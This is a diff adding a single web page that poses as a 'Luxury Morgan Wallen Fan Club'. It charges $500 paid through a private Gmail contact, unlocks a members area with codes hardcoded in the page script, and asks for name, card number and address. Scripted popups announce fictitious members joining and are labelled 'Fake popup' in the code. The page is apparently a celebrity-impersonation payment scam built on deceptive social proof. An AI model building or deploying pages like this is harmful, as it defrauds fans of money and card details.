@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Luxury Morgan Wallen Fan Club</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+body {
+  margin:0;
+  font-family:'Inter';
+  color:#fff;
+  text-align:center;
+
+  /* NEW BACKGROUND */
+  background: radial-gradient(circle at top, #1a1a1a, #000);
+}
+
+/* Pages */
+.page { display:none; padding:30px 20px; }
+.active { display:block; }
+
+/* Title */
+h1 {
+  font-family:'Playfair Display';
+  color:gold;
+  text-shadow:0 0 15px gold;
+}
+
+/* TikTok (FIXED) */
+.tiktok {
+  width:220px;
+  height:380px;
+  margin:20px auto;
+  border-radius:15px;
+  overflow:hidden;
+  box-shadow:0 0 20px rgba(255,215,0,0.5);
+}
+
+/* Buttons */
+button {
+  padding:14px 25px;
+  border:none;
+  border-radius:30px;
+  background:linear-gradient(45deg,#d4af37,#ffd700);
+  color:#000;
+  font-weight:bold;
+  margin:10px;
+  cursor:pointer;
+}
+
+/* Cards */
+.card {
+  background:rgba(255,255,255,0.05);
+  border-radius:20px;
+  padding:20px;
+  margin:20px auto;
+  max-width:320px;
+  box-shadow:0 0 20px rgba(255,215,0,0.2);
+}
+
+/* Input */
+input {
+  padding:12px;
+  border-radius:10px;
+  border:none;
+  margin:8px;
+  width:80%;
+}
+
+/* Loader */
+.loader {
+  border:5px solid #333;
+  border-top:5px solid gold;
+  border-radius:50%;
+  width:50px;
+  height:50px;
+  animation:spin 1s linear infinite;
+  margin:20px auto;
+}
+@keyframes spin { 100% { transform:rotate(360deg); } }
+
+/* Fan Card */
+.fancard {
+  background:black;
+  border:2px solid gold;
+  border-radius:15px;
+  padding:15px;
+  width:250px;
+  margin:20px auto;
+  box-shadow:0 0 20px gold;
+}
+
+/* Popup */
+.popup {
+  position:fixed;
+  bottom:20px;
+  left:20px;
+  background:#111;
+  padding:10px 15px;
+  border-radius:10px;
+  box-shadow:0 0 10px gold;
+  font-size:12px;
+  display:none;
+}
+</style>
+</head>
+
+<body>
+
+<div id="popup" class="popup"></div>
+
+<!-- PAGE 1 -->
+<div id="page1" class="page active">
+
+<h1>Luxury Morgan Wallen Fan Club</h1>
+
+<!-- TikTok now properly placed -->
+<div class="tiktok">
+<iframe src="https://www.tiktok.com/embed/ZSH1SVHGu?autoplay=1&mute=1" width="220" height="380"></iframe>
+</div>
+
+<p style="color:gold;">Private Fan Access</p>
+
+<p>
+To continue, you need to subscribe <b>$500</b>.<br>
+After payment, contact the manager to receive your VIP code.
+</p>
+
+<button onclick="contactManager()">Subscribe & Contact Manager</button>
+<br>
+<button onclick="nextPage('page2')">I Have a Code</button>
+
+</div>
+
+<!-- PAGE 2 -->
+<div id="page2" class="page">
+<h2>Enter VIP Code</h2>
+<input id="codeInput" placeholder="Enter code">
+<br>
+<button onclick="checkCode()">Unlock</button>
+</div>
+
+<!-- PAGE 3 -->
+<div id="page3" class="page">
+
+<h1>Welcome VIP ✨</h1>
+
+<div class="card">
+<h2>About Morgan Wallen</h2>
+<p>
+Morgan Wallen is a global country music star known for his chart-topping hits
+and strong fanbase worldwide.
+</p>
+</div>
+
+<div class="card">
+<h2>Premium Fan Card</h2>
+
+<p style="color:gold;">To get premium fan card, DM the manager.</p>
+
+<input id="name" placeholder="Full Name"><br>
+<input id="card" placeholder="Card Number"><br>
+<input id="address" placeholder="Address"><br>
+<input id="country" placeholder="Country"><br>
+
+<button onclick="generateCard()">Generate Fan Card</button>
+
+<div id="loading"></div>
+<div id="cardOutput"></div>
+
+<button onclick="downloadCard()">Download Card</button>
+
+</div>
+
+<div class="card">
+<h2>Concert & Tour Access 🎟</h2>
+<p>Contact manager for VIP tickets and tour access.</p>
+<button onclick="contactManager()">Contact Manager</button>
+</div>
+
+</div>
+
+<script>
+
+function nextPage(p){
+  document.querySelectorAll('.page').forEach(x=>x.style.display="none");
+  document.getElementById(p).style.display="block";
+}
+
+function contactManager(){
+  window.location.href="mailto:bencil99804@gmail.com";
+}
+
+let VALID_CODES = [
+"prod_UEChbAtkebx4Zs",
+"prod_UECg4zXspsH1FV",
+"prod_UECfBcooNiqm6s"
+];
+
+function checkCode(){
+  let code = document.getElementById("codeInput").value;
+  if(VALID_CODES.includes(code)){
+    nextPage('page3');
+  } else {
+    alert("Invalid code");
+  }
+}
+
+function generateCard(){
+  let name = document.getElementById("name").value;
+  let card = document.getElementById("card").value;
+  let address = document.getElementById("address").value;
+  let country = document.getElementById("country").value;
+
+  document.getElementById("loading").innerHTML = "<div class='loader'></div>";
+
+  setTimeout(()=>{
+    document.getElementById("loading").innerHTML = "";
+    document.getElementById("cardOutput").innerHTML = `
+    <div class="fancard" id="realCard">
+      <h3 style="color:gold;">VIP FAN CARD</h3>
+      <p>${name}</p>
+      <p>${card}</p>
+      <p>${address}</p>
+      <p>${country}</p>
+    </div>`;
+  },2000);
+}
+
+function downloadCard(){
+  let card = document.getElementById("realCard");
+  if(!card){ alert("Generate card first"); return; }
+  let win = window.open();
+  win.document.write(card.outerHTML);
+}
+
+/* Fake popup */
+let names = ["Alex","John","Mike","Sarah","Chris"];
+setInterval(()=>{
+  let popup = document.getElementById("popup");
+  let random = names[Math.floor(Math.random()*names.length)];
+  popup.innerText = random + " just joined VIP!";
+  popup.style.display="block";
+  setTimeout(()=>popup.style.display="none",3000);
+},5000);
+
+</script>
+
+</body>
+</html>
